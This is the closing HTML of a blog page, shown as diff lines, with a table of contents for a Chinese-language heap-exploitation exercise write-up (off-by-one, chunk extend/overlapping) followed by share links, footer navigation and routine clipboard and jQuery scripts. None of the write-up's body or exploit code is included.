+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">分析源码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#create-heap"><span class="toc-number">1.1.</span> <span class="toc-text">create_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit-heap"><span class="toc-number">1.2.</span> <span class="toc-text">edit_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show-heap"><span class="toc-number">1.3.</span> <span class="toc-text">show_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete-heap"><span class="toc-number">1.4.</span> <span class="toc-text">delete_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struct%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.5.</span> <span class="toc-text">struct结构体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99exp"><span class="toc-number">3.</span> <span class="toc-text">编写exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84"><span class="toc-number">3.1.</span> <span class="toc-text">内存结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91off-by-one%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%88%90Extend"><span class="toc-number">3.2.</span> <span class="toc-text">触发off-by-one漏洞完成Extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%BAgetshell%E5%81%9A%E5%87%86%E5%A4%87"><span class="toc-number">3.3.</span> <span class="toc-text">泄露函数，为getshell做准备</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&text=chunk extend/overappling例题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&is_video=false&description=chunk extend/overappling例题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=chunk extend/overappling例题&body=Check out this article: http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&title=chunk extend/overappling例题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&name=chunk extend/overappling例题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/09/30/chunk-extend-overappling-%E4%BE%8B%E9%A2%98/&t=chunk extend/overappling例题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
